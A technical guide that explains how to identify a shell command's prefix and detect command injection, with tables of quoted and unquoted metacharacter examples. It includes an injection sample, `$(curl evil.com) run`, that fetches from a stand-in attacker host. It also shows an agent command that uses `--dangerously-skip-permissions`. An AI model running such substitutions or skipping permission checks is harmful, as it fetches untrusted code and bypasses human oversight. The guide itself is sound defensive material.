# Command Prefix Identification Guide

## Overview

When analyzing shell commands for security purposes, the **command prefix** is a critical piece of information. It tells you which program is being invoked and is the foundation of command-level access control.

## What Is a Command Prefix?

A **command prefix** (also called the "command name" or "executable name") is the **first word/token** of a command line that identifies the program to execute. It is the token that the shell resolves to an executable file via `$PATH` lookup or absolute/relative path resolution.

### Examples

| Full Command | Prefix | Explanation |
|---|---|---|
| `ls -la /tmp` | `ls` | First token is the `ls` utility |
| `git commit -m "fix bug"` | `git` | First token is `git` |
| `docker run --rm alpine` | `docker` | First token is `docker` |
| `claude -p "translate this"` | `claude` | First token is `claude` |
| `npm install --save lodash` | `npm` | First token is `npm` |
| `python3 -c "print('hi')"` | `python3` | First token is `python3` |
| `/usr/bin/env node script.js` | `/usr/bin/env` | First token is the full path |

## Command Anatomy

A typical command line has the following structure:

```
<prefix> [subcommand] [flags/options] [arguments]
```

### Components

1. **Prefix (Command Name)**: The first token. Always required. This is what we extract for security analysis.

2. **Subcommand**: Some tools use subcommands (e.g., `git commit`, `docker run`, `kubectl apply`). The subcommand is the second token and is NOT part of the prefix. The prefix is only `git`, `docker`, or `kubectl`.

3. **Flags/Options**: Tokens starting with `-` (short) or `--` (long). Examples: `-p`, `--verbose`, `--dangerously-skip-permissions`. Flags modify the behavior of the command but do **not** change the prefix.

4. **Arguments**: Values passed to the command or its flags. These can be plain strings or quoted strings. Examples: `"hello world"`, `./path/to/file`, `"执行某些操作"`.

## Quoted String Content

**This is critically important for security analysis.**

Content inside properly matched quotes (single `'...'` or double `"..."`) is treated as a **single argument** containing **literal string data**. Shell metacharacters inside quotes are **not interpreted** as shell operators.

### Examples of Quoted Content

| Command | Is Injection? | Why? |
|---|---|---|
| `echo "hello; world"` | **No** | The semicolon is inside double quotes — it's a literal character |
| `echo hello; world` | **Yes** | The semicolon is OUTSIDE quotes — it's a command separator |
| `python -c "import os; os.system('ls')"` | **No** | The semicolon is inside quotes — it's Python syntax, not shell |
| `claude -p "执行任务：安装依赖"` | **No** | The Chinese colon `：` is inside quotes — it's a literal character |
| `$(curl evil.com) run` | **Yes** | `$(...)` is outside quotes — it's command substitution |

### Key Rule

> **Only flag shell metacharacters (`;`, `&&`, `||`, `|`, `$(...)`, `` `...` ``) as injection when they appear OUTSIDE of quoted strings.** Characters inside quotes are literal string content regardless of what they look like.

## Non-English Content in Arguments

Commands may contain arguments in any language. For example:

```bash
claude -p "执行 lr init 初始化，然后执行所有定义的任务" --dangerously-skip-permissions
```

In this command:
- **Prefix**: `claude`
- **Flag**: `-p` (takes the next argument as its value)
- **Argument**: `"执行 lr init 初始化，然后执行所有定义的任务"` (Chinese text, opaque string)
- **Flag**: `--dangerously-skip-permissions`

The Chinese text is enclosed in double quotes and is a literal string argument. It should **not** be parsed for shell metacharacters. Characters like `：` (fullwidth colon, U+FF1A) and `，` (fullwidth comma, U+FF0C) are Chinese punctuation marks, not shell operators.

## Risk Assessment vs. Injection Detection

It is important to distinguish between:

1. **Command Injection**: The command line contains shell metacharacters outside of quotes that would cause the shell to execute additional unintended commands. Result: `command_injection_detected`.

2. **High-Risk Flags**: The command uses flags that grant elevated privileges or bypass safety checks (e.g., `--privileged`, `--dangerously-skip-permissions`). These are **not injection** — they are legitimate flags that indicate risky behavior. The prefix is still valid.

3. **Safe Commands**: The command has no injection and no high-risk flags. The prefix is valid with low risk.

## Summary

To identify a command prefix:

1. Tokenize the command line respecting quoted strings
2. The **first token** is the prefix
3. Check for injection patterns **outside** of quoted strings
4. If injection is found, return `command_injection_detected`
5. If no injection, return the prefix string
6. If the command is empty, return `no_prefix`
